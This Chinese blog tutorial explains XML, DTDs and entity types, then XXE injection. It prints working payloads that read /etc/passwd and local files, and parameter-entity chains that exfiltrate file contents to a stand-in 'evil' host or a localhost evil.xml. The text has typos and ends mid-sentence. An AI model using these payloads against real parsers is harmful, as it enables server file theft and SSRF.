<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="xml注入与xxe注入基础知识"><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>xml注入与xxe注入基础知识 | Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xml%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">xml定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml%E4%BD%9C%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">xml作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml%E6%A0%BC%E5%BC%8F%E8%AF%B4%E6%98%8E"><span class="toc-number">3.</span> <span class="toc-text">xml格式说明</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#l-%E5%86%85%E9%83%A8%E5%A3%B0%E6%98%8E%E5%AE%9E%E4%BD%93"><span class="toc-number">3.0.1.</span> <span class="toc-text">l 内部声明实体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#l-%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">3.0.2.</span> <span class="toc-text">l 引用外部实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89CDATA"><span class="toc-number">3.1.</span> <span class="toc-text">（4）CDATA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%AE%9E%E4%BD%93"><span class="toc-number">4.</span> <span class="toc-text">XML实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881-%EF%BC%89%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93"><span class="toc-number">4.1.</span> <span class="toc-text">（1.）字符实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93"><span class="toc-number">4.2.</span> <span class="toc-text">（2）命名实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">4.3.</span> <span class="toc-text">（3）外部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">4.4.</span> <span class="toc-text">（4）参数实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">4.5.</span> <span class="toc-text">（5）内部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%86%99%E6%B3%95"><span class="toc-number">4.6.</span> <span class="toc-text">（6）命名实体+外部实体写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%86%99%E6%B3%95"><span class="toc-number">4.7.</span> <span class="toc-text">（7）第一种命名实体+外部实体+参数实体写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%888%EF%BC%89%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%86%99%E6%B3%95"><span class="toc-number">4.8.</span> <span class="toc-text">（8）第二种命名实体+外部实体+参数实体写法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E4%B8%AD%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81"><span class="toc-number">5.</span> <span class="toc-text">XML中的协议支持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-number">6.</span> <span class="toc-text">XXE注入定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">7.XXE漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">8.</span> <span class="toc-text">1.任意文件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8E%A2%E6%B5%8Bsql%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.</span> <span class="toc-text">2.探测sql盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%9C%B0%E5%9D%80"><span class="toc-number">10.</span> <span class="toc-text">3.探测内网地址</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">165</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">xml注入与xxe注入基础知识</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-10</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="xml定义"><a href="#xml定义" class="headerlink" title="xml定义"></a>xml定义</h2><p>xml由三个部分构成，它们分别是:文档类型定义(dtd)、即xml的布局语言；可拓展的样式语言即xml的样式表语言(xsl)；以及可拓展链接语言(XLL);<a id="more"></a><br><strong>xml</strong>：可拓展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。它被设计用来传输和存储数据，而不是储存数据；可拓展标记语言是一种很像超文本标记语言的标记语言。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。需要自行定义<br><strong>可扩展标记语言(XML)和超文本标记语言(HTML)为不同的目的而设计<br>它被设计用来传输和存储数据，其焦点是数据的内容。<br>超文本标记语言被设计用来显示数据，其焦点是数据的外观</strong></p>
<h2 id="xml作用"><a href="#xml作用" class="headerlink" title="xml作用"></a>xml作用</h2><p>XML使用元素和属性来描述数据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。使用XML做数据交换可以使应用程序更具有弹性，因为可以用位置(与普通文件一样)或用元素名(从数据库)来存取XML数据。                                                                                                   </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ⬆XML声明⬆ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  文件名 [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY实体名 <span class="meta-string">&quot;实体内容&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ⬆文档类型定义(DTD)⬆ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">元素名称</span> <span class="attr">category</span>=<span class="string">&quot;属性&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">文本或其他元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">元素名称</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ⬆文档元素⬆ --&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="xml格式说明"><a href="#xml格式说明" class="headerlink" title="xml格式说明"></a>xml格式说明</h2><p>xml用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML生命、DTD文档类型定义(可选)、文档元素。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>#xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span>#文档类型定义</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  #文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">Ffrom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span>     </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块、DTF可以在xml文档内生命，也可以外部引用。</p>
<p>（1）内部声明DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>（2）引用外部DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 system &quot;文件名&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot;&quot;文件名&quot;&gt;</span><br><span class="line">DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用</span><br></pre></td></tr></table></figure>

<p>（3）DTD的实体<br><strong>作用</strong>：DTD（文档类型定义）的作用是定义xml文档的合法构建模块。DTD可以在xml文档内声明，也可以外部引用。</p>
<p>外部实体是指XML处理器必须解析的数据。它对于在多个文档之间创建共享的公共引用很有用。对外部实体进行的任何更改将在包含对其的应用的文档中，自动更新。即xml使用外部实体将信息或“内容”将自动提取到xml文档的正文中。为此，我们需要在xml文档内部声明一个外部实体<br><strong>DTD实体适用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。。</strong>我们可以在内部确定其值（内部子集）：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">AppSec</span> <span class="meta-string">&quot;Appsec-Labs&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或从外部来源(外部子集):</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">AppSec</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://site.com/some_content/html&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>SYSTEM标识符：</strong>该标识符意味着该实体将从外部来源获取内容，在本例中，该内容是“site.com”下的一个页面。</p>
<p>为了声明这些实体，我们需要在文档类型定义（DTD）中进行。DTD是一组标记声明，用于定义XML的文档类型。它定义了XML文档的合法结构块和具有合法元素和属性列表的文档结构。DTD可以在XML文档内部声明，也可以作为外部引用声明—使用SYSTEM标识符指向可解析位置中的另一组声明。ENTITY可以使用SYSTEM关键字,调用外部资源,而这里是支持很多的协议,如:http;file等，然后,在其他DoM结点中可以使用如:&test;引用该实体内容.</p>
<p>那么,如果在产品功能设计当中,解析的xml是由外部可控制的,那将可能形成,如:文件读取,DoS,CSRF等漏洞.</p>
<p>如果要引用一个外部资源,可以借助各种协议 几个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file.ext</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php</span><br></pre></td></tr></table></figure>

<p>我们来看一个DTD的例子，一个在DTD里面有一个SYSTEM标识符的实体：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Author[</span><br><span class="line">&lt;!ENTITY app SYSTEM &quot;http:&#x2F;&#x2F;site.com&#x2F;some_conten.html&quot;&gt;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="l-内部声明实体"><a href="#l-内部声明实体" class="headerlink" title="l 内部声明实体"></a>l 内部声明实体</h4><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>一个内部实体声明</p>
<!ENTITY 实体名称 "实体的值">

<p>例子</p>
<p>DTD:</p>
<!ENTITY writer "me">

<p>XML:</p>
<p><author>&writer;</author></p>
<p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<h4 id="l-引用外部实体"><a href="#l-引用外部实体" class="headerlink" title="l 引用外部实体"></a>l 引用外部实体</h4><p>一个外部实体声明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>例子</p>
<p>DTD:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;dtd&#x2F;writer.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>

<p>外部实体类型有</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411142435.gif" alt="xxe"></p>
<h3 id="（4）CDATA"><a href="#（4）CDATA" class="headerlink" title="（4）CDATA"></a>（4）CDATA</h3><p>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。</p>
<p>在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。</p>
<p>某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</p>
<p>CDATA 部分中的所有内容都会被解析器忽略。</p>
<p>CDATA 部分由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&lt;![CDATA[&quot; 开始，由 &quot;]]&gt;&quot;</span><br></pre></td></tr></table></figure>

<p> 结束</p>
<h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><p>XML的实体分为以下五种:字符实体、命名实体、外部实体、参数实体、内部实体、普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上<strong>SYSTEM关键字</strong>，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体代指内容为字符串。</p>
<h3 id="（1-）字符实体"><a href="#（1-）字符实体" class="headerlink" title="（1.）字符实体"></a>（1.）字符实体</h3><p>指用十进制格式(&#aaa;)或十六进制格式x;来指定任意Unicode字符。对XML解析器而言，字符实体与直接输入指定字符的效果完全相同。</p>
<h3 id="（2）命名实体"><a href="#（2）命名实体" class="headerlink" title="（2）命名实体"></a>（2）命名实体</h3><p>也称为内部实体，在DTD或内部子集（即文档中&lt;!DOCTYPE&gt;语句的一部分）中生命，在文档中用作引用。在xml文档解析过程中，实体引用将由它的表示替代</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot; &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;otherhost&#x2F;xxxx.php&quot; &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>可以用做xxe+ssrf</strong></p>
<h3 id="（3）外部实体"><a href="#（3）外部实体" class="headerlink" title="（3）外部实体"></a>（3）外部实体</h3><p>外部实体表示外部文件的内容，用 SYSTEM 关键词表示。</p>
<!ENTITY test SYSTEM "1.xml">

<p>有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE Anything [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY entityex SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;abc&gt;&amp;entityex;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取，并把读取的内容替换entityex出现的地方。</p>
<p>　　假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd)或者远程文件（http:&#x2F;&#x2F;www.baidu.com&#x2F;abc.txt）</span><br></pre></td></tr></table></figure>

<h3 id="（4）参数实体"><a href="#（4）参数实体" class="headerlink" title="（4）参数实体"></a>（4）参数实体</h3><p>参数实体只用于DTD和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的应用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“%”字符（或十六进制编码的%）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411143509.gif" alt="img"></p>
<!ENTITY % 实体名称 "实体的值">

<p>或者</p>
<!ENTITY % 实体名称 SYSTEM "URI">

<p>参数实体只能在 DTD文件中被引用，其他实体在XML文档内引用。<br>即下面实例，参数实体 在DOCTYPE内 ，其他实体在外</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % name SYSTEM “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>


<p>%name;<br>]&gt;</p>
<p>参数实体在DTD中解析优先级高于xml内部实体</p>
<p>实体相当于变量 “file:///etc/passwd”赋值给name</p>
<p>先写一段简单的xml利用代码,以php为例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line"></span><br><span class="line">$xml &#x3D; simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;name;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;name;中-&gt;name</span><br></pre></td></tr></table></figure>

<h3 id="（5）内部实体"><a href="#（5）内部实体" class="headerlink" title="（5）内部实体"></a>（5）内部实体</h3><p>内置实体为预留的实体，如：</p>
<p>实体引用字符</p>
<p>&lt;     &lt;</p>
<p>&gt;      &gt;</p>
<p>&amp;     &amp;</p>
<p>&quot;     “</p>
<p>&apos;     ‘</p>
<p>而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<p>关于实体嵌套的情况，比较幸运的是DTD中支持单双引号，所以可以通过单双引号间隔使用作为区分嵌套实体和实体之间的关系；在实际使用中，我们通常需要再嵌套一个参数实体，%号是需要处理成 &#37; 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;evil&#x2F;log?%payload;&quot; &gt;&#39;</span><br></pre></td></tr></table></figure>

<p>&#37;也可写为16进制&#x25;</p>
<p>另：内部实体的这支持与否也是取决于解释器的</p>
<h3 id="（6）命名实体-外部实体写法"><a href="#（6）命名实体-外部实体写法" class="headerlink" title="（6）命名实体+外部实体写法"></a>（6）命名实体+外部实体写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;value&gt;&amp;dtd;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>

<p>这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多</p>
<h3 id="（7）第一种命名实体-外部实体-参数实体写法"><a href="#（7）第一种命名实体-外部实体-参数实体写法" class="headerlink" title="（7）第一种命名实体+外部实体+参数实体写法"></a>（7）第一种命名实体+外部实体+参数实体写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt; </span><br><span class="line">%dtd; %all; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.xml文件内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;localhost:88%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send</p>
<h3 id="（8）第二种命名实体-外部实体-参数实体写法"><a href="#（8）第二种命名实体-外部实体-参数实体写法" class="headerlink" title="（8）第二种命名实体+外部实体+参数实体写法"></a>（8）第二种命名实体+外部实体+参数实体写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;test&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.xml文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;localhost:88&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>

<p>调用过程和第一种方法类似</p>
<h2 id="XML中的协议支持"><a href="#XML中的协议支持" class="headerlink" title="XML中的协议支持"></a>XML中的协议支持</h2><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411145334.gif" alt="img"></p>
<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<h2 id="XXE注入定义"><a href="#XXE注入定义" class="headerlink" title="XXE注入定义"></a>XXE注入定义</h2><p>XXE注入，即XML 外部实体注入。通过XML实体，“SYSTEM”关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，是处理程序解析它。当应用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>ENTITY实体，在一个甚至多个XML文档中频繁使用某一条数据，我们预先定义一个这条数据的”别名”，即一个ENTITY，然后再这些文档中需要该数据的地方调用它。XML定义了两种类型的ENTITY，一种在XML文档中使用</p>
<p>若是在PHP中，若是在PHP中,libxml_disable_entity_loader设置为TRUE可禁用外部实体注。入另一种作为参数在DTD文件中使用。ENTITY的定义语法：</p>
